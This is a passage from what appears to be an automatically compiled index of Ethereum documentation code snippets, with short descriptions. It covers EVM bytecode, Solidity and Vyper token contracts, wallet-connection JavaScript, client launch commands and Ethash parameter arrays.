DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0xFAB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP POP POP JUMP INVALID GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220746F20746865207A65726F2061 PUSH5 0x6472657373 GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH2 0x7070 PUSH19 0x6F766520746F20746865207A65726F20616464 PUSH19 0x65737345524332303A207472616E7366657220 PUSH2 0x6D6F PUSH22 0x6E7420657863656564732062616C616E636545524332 ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220616D6F756E7420657863656564 PUSH20 0x20616C6C6F77616E636545524332303A20747261 PUSH15 0x736665722066726F6D20746865207A PUSH6 0x726F20616464 PUSH19 0x65737345524332303A20617070726F76652066 PUSH19 0x6F6D20746865207A65726F2061646472657373 GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH5 0x6563726561 PUSH20 0x656420616C6C6F77616E63652062656C6F77207A PUSH6 0x726FA2646970 PUSH7 0x735822122081C8 BLOCKHASH CREATE DUP8 0xCE 0xF9 0x2F 0xEC 0xCB SUB STATICCALL 0xDC PUSH8 0x8B2708C331896EC5 NUMBER 0x2B 0x5D 0x4C PUSH8 0x5F27B6D3E664736F PUSH13 0x63430006020033000000000000\n```\n\n----------------------------------------\n\nTITLE: Testing Multi-byte Cache Keys\nDESCRIPTION: Prepares a large cache to test encoding of values with keys that require multiple bytes to represent, covering one-byte, two-byte, and three-byte keys.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Test encodeVal when the key is more than a single byte\n    // Maximum three bytes because filling the cache to four bytes takes\n    // too long.\n    function testEncodeValBig() public {\n        // Put a number of values in the cache.\n        // To keep things simple, use key n for value n.\n        for(uint i=1; i<0x1FFF; i++) {\n            cache.cacheWrite(i);\n        }\n```\n\n----------------------------------------\n\nTITLE: Ethereum Contract Interaction Function Stubs\nDESCRIPTION: Empty function implementations that will be used to interact with an Ethereum smart contract, including functions for loading messages, connecting wallets, and updating contract state.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n//export const helloWorldContract;\n\nexport const loadCurrentMessage = async () => {}\n\nexport const connectWallet = async () => {}\n\nconst getCurrentWalletConnected = async () => {}\n\nexport const updateMessage = async (message) => {}\n```\n\n----------------------------------------\n\nTITLE: Defining Cache Sizes Array in Plaintext\nDESCRIPTION: A named array 'cache_sizes' containing progressive cache size values in bytes. This array likely defines the different cache size options available for Ethereum client configurations.\n\nLANGUAGE: plaintext\nCODE:\n```\ncache_sizes = [\n16776896, 16907456, 17039296, 17170112, 17301056, 17432512, 17563072,\n17693888, 17824192, 17955904, 18087488, 18218176, 18349504, 18481088,\n18611392, 18742336, 18874304, 19004224, 19135936, 19267264, 19398208,\n19529408, 19660096, 19791424, 19922752, 20053952, 20184896, 20315968,\n20446912, 20576576, 20709184, 20840384, 20971072, 21102272, 21233216,\n21364544, 21494848, 21626816, 21757376, 21887552, 22019392, 22151104,\n22281536, 22412224, 22543936, 22675264, 22806464, 22935872, 23068096,\n23198272, 23330752, 23459008, 23592512, 23723968, 23854912, 23986112,\n24116672, 24247616, 24378688, 24509504, 24640832, 24772544, 24903488,\n25034432, 25165376, 25296704, 25427392, 25558592, 25690048, 25820096,\n25951936, 26081728, 26214208, 26345024, 26476096, 26606656, 26737472,\n26869184, 26998208, 27131584, 27262528, 27393728, 27523904, 27655744,\n27786688, 27917888, 28049344, 28179904, 28311488, 28441792, 28573504,\n28700864, 28835648, 28966208, 29096768, 29228608, 29359808, 29490752,\n29621824, 29752256, 29882816, 30014912, 30144448, 30273728, 30406976,\n30538432, 30670784, 30799936, 30932672, 31063744, 31195072, 31325248,\n31456192, 31588288, 31719232, 31850432, 31981504, 32110784, 32243392,\n32372672, 32505664, 32636608, 32767808, 32897344, 33029824, 33160768,\n33289664, 33423296, 33554368, 33683648, 33816512, 33947456, 34076992,\n34208704, 34340032, 34471744, 34600256, 34734016, 34864576, 34993984,\n35127104, 35258176, 35386688, 35518528, 35650624, 35782336, 35910976,\n36044608, 36175808, 36305728, 36436672, 36568384, 36699968, 36830656,\n36961984, 37093312, 37223488, 37355072, 37486528, 37617472, 37747904,\n37879232, 38009792, 38141888, 38272448, 38403392, 38535104, 38660672,\n38795584, 38925632, 39059264, 39190336, 39320768, 39452096, 39581632,\n39713984, 39844928, 39974848, 40107968, 40238144, 40367168, 40500032,\n40631744, 40762816, 40894144, 41023552, 41155904, 41286208, 41418304,\n41547712, 41680448, 41811904, 41942848, 42073792, 42204992, 42334912,\n42467008, 42597824, 42729152, 42860096, 42991552, 43122368, 43253696,\n43382848, 43515712, 43646912, 43777088, 43907648, 44039104, 44170432,\n44302144, 44433344, 44564288, 44694976, 44825152, 44956864, 45088448,\n45219008, 45350464, 45481024, 45612608, 45744064, 45874496, 46006208,\n46136768, 46267712, 46399424, 46529344, 46660672, 46791488, 46923328,\n47053504, 47185856, 47316928, 47447872, 47579072, 47710144, 47839936,\n47971648, 48103232, 48234176, 48365248, 48496192, 48627136, 48757312,\n48889664, 49020736, 49149248, 49283008, 49413824, 49545152, 49675712,\n49807168, 49938368, 50069056, 50200256, 50331584, 50462656, 50593472,\n50724032, 50853952, 50986048, 51117632, 51248576, 51379904, 51510848,\n51641792, 51773248, 51903296, 52035136, 52164032, 52297664, 52427968,\n52557376, 52690112, 52821952, 52952896, 53081536, 53213504, 53344576,\n53475776, 53608384, 53738816, 53870528, 54000832, 54131776, 54263744,\n54394688, 54525248, 54655936, 54787904, 54918592, 55049152, 55181248,\n55312064, 55442752, 55574336, 55705024, 55836224, 55967168, 56097856,\n56228672, 56358592, 56490176, 56621888, 56753728, 56884928, 57015488,\n57146816, 57278272, 57409216, 57540416, 57671104, 57802432, 57933632,\n58064576, 58195264, 58326976, 58457408, 58588864, 58720192, 58849984,\n58981696, 59113024, 59243456, 59375552, 59506624, 59637568, 59768512,\n59897792, 60030016, 60161984, 60293056, 60423872, 60554432, 60683968,\n60817216, 60948032, 61079488, 61209664, 61341376, 61471936, 61602752,\n61733696, 61865792, 61996736, 62127808, 62259136, 62389568, 62520512,\n62651584, 62781632, 62910784, 63045056, 63176128, 63307072, 63438656,\n63569216, 63700928, 63831616, 63960896, 64093888, 64225088, 64355392,\n64486976, 64617664, 64748608, 64879424, 65009216, 65142464, 65273792,\n65402816, 65535424, 65666752, 65797696, 65927744, 66060224, 66191296,\n66321344, 66453056, 66584384, 66715328, 66846656, 66977728, 67108672,\n67239104, 67370432, 67501888, 67631296, 67763776, 67895104, 68026304,\n68157248, 68287936, 68419264, 68548288, 68681408, 68811968, 68942912,\n69074624, 69205568, 69337024, 69467584, 69599168, 69729472, 69861184,\n```\n\n----------------------------------------\n\nTITLE: Importing Viem Library Dependencies for Ethereum Interaction\nDESCRIPTION: Importing necessary functions and types from the Viem library to interact with Ethereum blockchains in TypeScript.\n\nLANGUAGE: typescript\nCODE:\n```\nimport { createPublicClient, createWalletClient, getContract, http, Address } from 'viem'\n```\n\n----------------------------------------\n\nTITLE: Implementing Token System in Serpent for Ethereum\nDESCRIPTION: A basic implementation of a token system in Serpent language. This snippet demonstrates the core logic for transferring tokens between accounts, checking if the sender has enough tokens before allowing the transfer to complete.\n\nLANGUAGE: python\nCODE:\n```\ndef send(to, value):\n  if self.storage[msg.sender] >= value:\n    self.storage[msg.sender] = self.storage[msg.sender] - value\n    self.storage[to] = self.storage[to] + value\n```\n\n----------------------------------------\n\nTITLE: Using eth_sendTransaction in JavaScript\nDESCRIPTION: Example of parameters for the eth_sendTransaction method, which creates a new message call transaction or contract creation. The method requires transaction details including from/to addresses, gas limits, value, and input data.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\n  {\n    from: \"0xb60e8dd61c5d32be8058bb8eb970870f07233155\",\n    to: \"0xd46e8dd67c5d32be8058bb8eb970870f07244567\",\n    gas: \"0x76c0\", // 30400\n    gasPrice: \"0x9184e72a000\", // 10000000000000\n    value: \"0x9184e72a\", // 2441406250\n    input:\n      \"0xd46e8dd67c5d32be8d46e8dd67c5d32be8058bb8eb970870f072445675058bb8eb970870f072445675\",\n  },\n]\n```\n\n----------------------------------------\n\nTITLE: Type Declaration Guidelines for Variables in TypeScript\nDESCRIPTION: Guidelines for when to explicitly declare types for variables in TypeScript. Only declare types when they aren't obvious and can't be inferred by the compiler. For unassigned variables, type declarations are necessary when the type cannot be inferred.\n\nLANGUAGE: typescript\nCODE:\n```\n// Do not use\nconst someVar: string = 'string'\n\n// Use\nconst someVar = 'string'\n```\n\nLANGUAGE: typescript\nCODE:\n```\nconst someVar: string\n```\n\n----------------------------------------\n\nTITLE: Defining Liquidity Events in Uniswap Pair\nDESCRIPTION: Defines events emitted when liquidity providers deposit (Mint) or withdraw (Burn) liquidity. The events include token amounts and the sender's address.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Mint(address indexed sender, uint amount0, uint amount1);\nevent Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n```\n\n----------------------------------------\n\nTITLE: Creating getCurrentWalletConnected Function for Persistent Wallet State\nDESCRIPTION: Function that checks if a wallet is already connected to the dApp. It uses the eth_accounts method to retrieve connected accounts without prompting the user. This allows the application to maintain wallet connection state across page refreshes.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const getCurrentWalletConnected = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_accounts\",\n      })\n      if (addressArray.length > 0) {\n        return {\n          address: addressArray[0],\n          status: \"👆🏽 Write a message in the text-field above.\",\n        }\n      } else {\n        return {\n          address: \"\",\n          status: \"🦊 Connect to MetaMask using the top right button.\",\n        }\n      }\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Minting and Burning Functions in ERC-721 Contract\nDESCRIPTION: External functions for token lifecycle management: mint for creating new tokens (restricted to the minter) and burn for destroying existing tokens (restricted to owner or approved addresses).\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef mint(_to: address, _tokenId: uint256) -> bool:\n    \"\"\"\n    @dev Function to mint tokens\n         Throws if `msg.sender` is not the minter.\n         Throws if `_to` is zero address.\n         Throws if `_tokenId` is owned by someone.\n    @param _to The address that will receive the minted tokens.\n    @param _tokenId The token id to mint.\n    @return A boolean that indicates if the operation was successful.\n    \"\"\"\n    # Throws if `msg.sender` is not the minter\n    assert msg.sender == self.minter\n    # Throws if `_to` is zero address\n    assert _to != ZERO_ADDRESS\n    # Add NFT. Throws if `_tokenId` is owned by someone\n    self._addTokenTo(_to, _tokenId)\n    log Transfer(ZERO_ADDRESS, _to, _tokenId)\n    return True\n\n\n@external\ndef burn(_tokenId: uint256):\n    \"\"\"\n    @dev Burns a specific ERC721 token.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId uint256 id of the ERC721 token to be burned.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(msg.sender, _tokenId)\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    self._clearApproval(owner, _tokenId)\n    self._removeTokenFrom(owner, _tokenId)\n    log Transfer(owner, ZERO_ADDRESS, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Creating GitHub Issue Button Link Using ButtonLink Component\nDESCRIPTION: HTML/JSX snippet that creates a button linking to GitHub's issue creation page with pre-populated parameters for suggesting new resources to ethereum.org.\n\nLANGUAGE: html\nCODE:\n```\n<ButtonLink href=\"https://github.com/ethereum/ethereum-org-website/issues/new?assignees=&labels=resource+📚&template=suggest_resource.yaml\">\n  Create an issue\n</ButtonLink>\n```\n\n----------------------------------------\n\nTITLE: CALL Opcode (F1) Memory Operations\nDESCRIPTION: The CALL opcode (F1) invokes another contract and stores the return data in memory. It takes gas limit, address, value, and memory locations for arguments and return data.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] := returndata\n```\n\n----------------------------------------\n\nTITLE: Testing Transfer Function with Optimized Calldata in JavaScript\nDESCRIPTION: Test code for the optimized transfer function that uses compact calldata to transfer tokens through the proxy. The code demonstrates how to construct the compact transaction data format.\n\nLANGUAGE: javascript\nCODE:\n```\n// Transfer tokens\nconst destAddr = \"0xf5a6ead936fb47f342bb63e676479bddf26ebe1d\"\nconst transferTx = {\n  to: cdi.address,\n  data: \"0x02\" + destAddr.slice(2, 42) + \"0100\",\n}\nawait (await signer.sendTransaction(transferTx)).wait()\n```\n\n----------------------------------------\n\nTITLE: Verifying Cache Storage After Function Call\nDESCRIPTION: Checks that values were correctly stored in the cache with the expected keys after the function call.\n\nLANGUAGE: solidity\nCODE:\n```\n        assertEq(cache.cacheRead(1), VAL_A);\n        assertEq(cache.cacheRead(2), VAL_C);\n```\n\n----------------------------------------\n\nTITLE: Testing Revert Functionality in Foundry for WORM Contract\nDESCRIPTION: Uses Foundry's vm.expectRevert to test that writing to an already written key properly reverts with the expected error message.\n\nLANGUAGE: solidity\nCODE:\n```\n    function testWReadWrite() public {\n        worm.writeEntry(0xDEAD, 0x60A7);\n\n        vm.expectRevert(bytes(\"entry already written\"));\n        worm.writeEntry(0xDEAD, 0xBEEF);\n```\n\n----------------------------------------\n\nTITLE: Setting up Alchemy Websocket URL in .env File\nDESCRIPTION: Example of storing the Alchemy Websocket URL in a .env file for secure access to the Ethereum network. Uses Goerli testnet in this example.\n\nLANGUAGE: javascript\nCODE:\n```\nREACT_APP_ALCHEMY_KEY = wss://eth-goerli.ws.alchemyapi.io/v2/<key>\n```\n\n----------------------------------------\n\nTITLE: Creating an Interaction Script for Smart Contract\nDESCRIPTION: Initial setup for a JavaScript file that will interact with the deployed contract, importing environment variables for API key, private key, and contract address.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nconst API_KEY = process.env.API_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS\n```\n\n----------------------------------------\n\nTITLE: Defining Memory Address Array in Numerical Format\nDESCRIPTION: A large array of memory addresses represented as numerical values. These appear to be byte-aligned memory addresses that could be used for memory management or allocation in Ethereum's core systems.\n\nLANGUAGE: javascript\nCODE:\n```\n[14369685376, 14378071424, 14386462592, 14394848128, 14403230848,\n14411627392, 14420013952, 14428402304, 14436793472, 14445181568,\n14453569664, 14461959808, 14470347904, 14478737024, 14487122816,\n14495511424, 14503901824, 14512291712, 14520677504, 14529064832,\n14537456768, 14545845632, 14554234496, 14562618496, 14571011456,\n14579398784, 14587789184, 14596172672, 14604564608, 14612953984,\n14621341312, 14629724288, 14638120832, 14646503296, 14654897536,\n14663284864, 14671675264, 14680061056, 14688447616, 14696835968,\n14705228416, 14713616768, 14722003328, 14730392192, 14738784128,\n14747172736, 14755561088, 14763947648, 14772336512, 14780725376,\n14789110144, 14797499776, 14805892736, 14814276992, 14822670208,\n14831056256, 14839444352, 14847836032, 14856222848, 14864612992,\n14872997504, 14881388672, 14889775744, 14898165376, 14906553472,\n14914944896, 14923329664, 14931721856, 14940109696, 14948497024,\n14956887424, 14965276544, 14973663616, 14982053248, 14990439808,\n14998830976, 15007216768, 15015605888, 15023995264, 15032385152,\n15040768384, 15049154944, 15057549184, 15065939072, 15074328448,\n15082715008, 15091104128, 15099493504, 15107879296, 15116269184,\n15124659584, 15133042304, 15141431936, 15149824384, 15158214272,\n15166602368, 15174991232, 15183378304, 15191760512, 15200154496,\n15208542592, 15216931712, 15225323392, 15233708416, 15242098048,\n15250489216, 15258875264, 15267265408, 15275654528, 15284043136,\n15292431488, 15300819584, 15309208192, 15317596544, 15325986176,\n15334374784, 15342763648, 15351151744, 15359540608, 15367929728,\n15376318336, 15384706432, 15393092992, 15401481856, 15409869952,\n15418258816, 15426649984, 15435037568, 15443425664, 15451815296,\n15460203392, 15468589184, 15476979328, 15485369216, 15493755776,\n15502146944, 15510534272, 15518924416, 15527311232, 15535699072,\n15544089472, 15552478336, 15560866688, 15569254528, 15577642624,\n15586031488, 15594419072, 15602809472, 15611199104, 15619586432,\n15627975296, 15636364928, 15644753792, 15653141888, 15661529216,\n15669918848, 15678305152, 15686696576, 15695083136, 15703474048,\n15711861632, 15720251264, 15728636288, 15737027456, 15745417088,\n15753804928, 15762194048, 15770582656, 15778971008, 15787358336,\n15795747712, 15804132224, 15812523392, 15820909696, 15829300096,\n15837691264, 15846071936, 15854466944, 15862855808, 15871244672,\n15879634816, 15888020608, 15896409728, 15904799104, 15913185152,\n15921577088, 15929966464, 15938354816, 15946743424, 15955129472,\n15963519872, 15971907968, 15980296064, 15988684928, 15997073024,\n16005460864, 16013851264, 16022241152, 16030629248, 16039012736,\n16047406976, 16055794816, 16064181376, 16072571264, 16080957824,\n16089346688, 16097737856, 16106125184, 16114514816, 16122904192,\n16131292544, 16139678848, 16148066944, 16156453504, 16164839552,\n16173236096, 16181623424, 16190012032, 16198401152, 16206790528,\n16215177344, 16223567744, 16231956352, 16240344704, 16248731008,\n16257117824, 16265504384, 16273898624, 16282281856, 16290668672,\n16299064192, 16307449216, 16315842176, 16324230016, 16332613504,\n16341006464, 16349394304, 16357783168, 16366172288, 16374561664,\n16382951296, 16391337856, 16399726208, 16408116352, 16416505472,\n16424892032, 16433282176, 16441668224, 16450058624, 16458448768,\n16466836864, 16475224448, 16483613056, 16492001408, 16500391808,\n16508779648, 16517166976, 16525555328, 16533944192, 16542330752,\n16550719616, 16559110528, 16567497088, 16575888512, 16584274816,\n16592665472, 16601051008, 16609442944, 16617832064, 16626218624,\n16634607488, 16642996096, 16651385728, 16659773824, 16668163712,\n16676552576, 16684938112, 16693328768, 16701718144, 16710095488,\n16718492288, 16726883968, 16735272832, 16743661184, 16752049792,\n16760436608, 16768827008, 16777214336, 16785599104, 16793992832,\n16802381696, 16810768768, 16819151744, 16827542656, 16835934848,\n16844323712, 16852711552, 16861101952, 16869489536, 16877876864,\n16886265728, 16894653056, 16903044736, 16911431296, 16919821696,\n16928207488, 16936592768, 16944987776, 16953375616, 16961763968,\n16970152832, 16978540928, 16986929536, 16995319168, 17003704448,\n17012096896, 17020481152, 17028870784, 17037262208, 17045649536,\n17054039936, 17062426496, 17070814336, 17079205504, 17087592064,\n17095978112, 17104369024, 17112759424, 17121147776, 17129536384,\n17137926016, 17146314368, 17154700928, 17163089792, 17171480192,\n17179864192, 17188256896, 17196644992, 17205033856, 17213423488,\n17221811072, 17230198912, 17238588032, 17246976896, 17255360384,\n17263754624, 17272143232, 17280530048, 17288918912, 17297309312,\n17305696384, 17314085504, 17322475136, 17330863744, 17339252096,\n17347640192, 17356026496, 17364413824, 17372796544, 17381190016,\n17389583488, 17397972608, 17406360704, 17414748544, 17423135872,\n17431527296, 17439915904, 17448303232, 17456691584, 17465081728,\n17473468288, 17481857408, 17490247552, 17498635904, 17507022464,\n17515409024, 17523801728, 17532189824, 17540577664, 17548966016,\n17557353344, 17565741184, 17574131584, 17582519168, 17590907008,\n17599296128, 17607687808, 17616076672, 17624455808, 17632852352,\n17641238656, 17649630848, 17658018944, 17666403968, 17674794112,\n17683178368, 17691573376, 17699962496, 17708350592, 17716739968,\n17725126528, 17733517184, 17741898112, 17750293888, 17758673024,\n17767070336, 17775458432, 17783848832, 17792236928, 17800625536,\n17809012352, 17817402752, 17825785984, 17834178944, 17842563968,\n17850955648, 17859344512, 17867732864, 17876119424, 17884511872,\n17892900224, 17901287296, 17909677696, 17918058112, 17926451072,\n17934843776, 17943230848, 17951609216, 17960008576, 17968397696,\n17976784256, 17985175424, 17993564032, 18001952128, 18010339712,\n18018728576, 18027116672, 18035503232, 18043894144, 18052283264,\n18060672128, 18069056384, 18077449856, 18085837184, 18094225792,\n18102613376, 18111004544, 18119388544, 18127781248, 18136170368,\n18144558976, 18152947328, 18161336192, 18169724288, 18178108544,\n18186498944, 18194886784, 18203275648, 18211666048, 18220048768,\n18228444544, 18236833408, 18245220736]\n```\n\n----------------------------------------\n\nTITLE: Running Nethermind Execution Client with Basic Configuration\nDESCRIPTION: Command to start the Nethermind execution client on Ethereum mainnet with basic configuration. It sets the data directory and configures the JWT secret file path for authentication with the consensus client.\n\nLANGUAGE: shell\nCODE:\n```\nNethermind.Runner --config mainnet \\\n    --datadir /data/ethereum \\\n    --JsonRpc.JwtSecretFile=/path/to/jwtsecret\n```\n\n----------------------------------------\n\nTITLE: Bitcoin Block Validation Algorithm in Pseudocode\nDESCRIPTION: This algorithm outlines the steps for validating a block in the Bitcoin blockchain. It checks the block's references, timestamp, proof-of-work, and applies all transactions sequentially to ensure the state transitions are valid.\n\nLANGUAGE: pseudocode\nCODE:\n```\n1. Comprueba si el bloque anterior al que hace referencia el bloque existe y es válido.\n2. Compruebe que la marca temporal del bloque es mayor que la del bloque anterior y menor de 2 horas en el futuro.\n3. Compruebe que la prueba de trabajo del bloque sea válida.\n4. Permita que `S[0]` sea el estado al final del bloque anterior.\n5. Supongamos que `TX` es la lista de transacciones del bloque con `n` transacciones. Para todo `i` de `0... -1`, asigne `S[i+1] = APPLY(S[i], X[i])` Si cualquier aplicación da error, salga y mostrará False.\n6. Muestra true y registra `S[n]` como el estado al final de este bloque.\n```\n\n----------------------------------------\n\nTITLE: Implementing DAG Double Buffer Management for Dagger-Hashimoto\nDESCRIPTION: Functions to manage the Directed Acyclic Graph (DAG) double buffer system in Ethereum mining. This system allows miners to gradually transition to new DAGs, reducing the risk of temporary centralization during recalculation periods.\n\nLANGUAGE: python\nCODE:\n```\ndef get_prevhash(n):\n    from pyethereum.blocks import GENESIS_PREVHASH\n    from pyethereum import chain_manager\n    if n <= 0:\n        return hash_to_int(GENESIS_PREVHASH)\n    else:\n        prevhash = chain_manager.index.get_block_by_number(n - 1)\n        return decode_int(prevhash)\n\ndef get_seedset(params, block):\n    seedset = {}\n    seedset[\"back_number\"] = block.number - (block.number % params[\"epochtime\"])\n    seedset[\"back_hash\"] = get_prevhash(seedset[\"back_number\"])\n    seedset[\"front_number\"] = max(seedset[\"back_number\"] - params[\"epochtime\"], 0)\n    seedset[\"front_hash\"] = get_prevhash(seedset[\"front_number\"])\n    return seedset\n\ndef get_dagsize(params, block):\n    return params[\"n\"] + (block.number // params[\"epochtime\"]) * params[\"n_inc\"]\n\ndef get_daggerset(params, block):\n    dagsz = get_dagsize(params, block)\n    seedset = get_seedset(params, block)\n    if seedset[\"front_hash\"] <= 0:\n        # No back buffer is possible, just make front buffer\n        return {\"front\": {\"dag\": produce_dag(params, seedset[\"front_hash\"], dagsz),\n                          \"block_number\": 0}}\n    else:\n        return {\"front\": {\"dag\": produce_dag(params, seedset[\"front_hash\"], dagsz),\n                          \"block_number\": seedset[\"front_number\"]},\n                \"back\": {\"dag\": produce_dag(params, seedset[\"back_hash\"], dagsz),\n                         \"block_number\": seedset[\"back_number\"]}}\n```\n\n----------------------------------------\n\nTITLE: Running Locales Generation Process with Yarn Commands\nDESCRIPTION: Describes when the locales generation process is triggered in the build pipeline. The process runs whenever 'yarn build' or 'yarn start' is executed, helping to optimize bundle size by including only necessary translations.\n\nLANGUAGE: bash\nCODE:\n```\nyarn build\nyarn start\n```\n\n----------------------------------------\n\nTITLE: Exécution du script de frappe NFT\nDESCRIPTION: Commande pour exécuter le script Node.js qui affiche l'ABI du contrat NFT dans la console.\n\nLANGUAGE: bash\nCODE:\n```\nnode scripts/mint-nft.js\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-20 Allowance Function in Solidity\nDESCRIPTION: The allowance function enables anyone to check the amount one address has authorized another to spend on their behalf. It simply returns the value stored in the _allowances mapping.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev See {IERC20-allowance}.\n */\nfunction allowance(address owner, address spender) public view virtual override returns (uint256) {\n    return _allowances[owner][spender];\n}\n```\n\n----------------------------------------\n\nTITLE: Index Range Failure Handling in Function 0x81e580d3\nDESCRIPTION: This code executes when the provided index is out of range, reverting the transaction without returning any data.\n\nLANGUAGE: evm\nCODE:\n```\n17A | PUSH1 0x00          | 0x00 ...      |\n17C | DUP1                | 0x00 0x00 ... |\n17D | REVERT              |               |\n```\n\n----------------------------------------\n\nTITLE: Running Erigon Execution Client with Basic Configuration\nDESCRIPTION: Command to start the Erigon execution client on Ethereum mainnet with basic configuration. It sets the data directory, enables JSON-RPC with specific namespaces, and configures JWT authentication for the consensus client connection.\n\nLANGUAGE: shell\nCODE:\n```\nerigon --chain mainnet \\\n    --datadir /data/ethereum  \\\n    --http --http.api=engine,eth,web3,net \\\n    --authrpc.jwtsecret=/path/to/jwtsecret\n```\n\n----------------------------------------\n\nTITLE: Implementing a Simple Betting Game Smart Contract in Solidity\nDESCRIPTION: A basic Solidity smart contract that implements a betting game where players can place bets and either win or lose. The contract tracks total games won and lost, and emits events when bets are placed.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity 0.7.1;\n\ncontract Game {\n    uint256 totalGamesPlayerWon = 0;\n    uint256 totalGamesPlayerLost = 0;\n    event BetPlaced(address player, uint256 value, bool hasWon);\n\n    function placeBet() external payable {\n        bool hasWon = evaluateBetForPlayer(msg.sender);\n\n        if (hasWon) {\n            (bool success, ) = msg.sender.call{ value: msg.value * 2 }('');\n            require(success, \"Transfer failed\");\n            totalGamesPlayerWon++;\n        } else {\n            totalGamesPlayerLost++;\n        }\n\n        emit BetPlaced(msg.sender, msg.value, hasWon);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using wscat to connect to Ethereum WebSocket endpoint\nDESCRIPTION: Example of using the wscat command-line tool to establish a WebSocket connection to Alchemy's Ethereum mainnet endpoint and making a simple eth_gasPrice request.\n\nLANGUAGE: bash\nCODE:\n```\nwscat -c wss://eth-mainnet.ws.alchemyapi.io/ws/demo\n\n>  {\"jsonrpc\":  \"2.0\", \"id\": 0, \"method\":  \"eth_gasPrice\"}\n\n<  {\"jsonrpc\":  \"2.0\", \"result\":  \"0xb2d05e00\", \"id\": 0}\n```\n\n----------------------------------------\n\nTITLE: REVERT Operation (FD) in Ethereum EVM\nDESCRIPTION: Halts execution and reverts state changes, returning data from memory as an error. Takes offset and length parameters to specify which memory segment to return as error data.\n\nLANGUAGE: solidity\nCODE:\n```\nrevert(mem[ost:ost+len-1])\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode Implementation of ERC-20 Token Contract\nDESCRIPTION: Low-level EVM (Ethereum Virtual Machine) bytecode for an ERC-20 token implementation. This includes bytecode instructions for core functions like transfer, approve, allowance, and balance operations, along with various safety checks like preventing transfers to zero addresses.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x83B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x452 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x41C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x908 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x4CE PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x482 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x926 JUMP JUMPDEST PUSH1 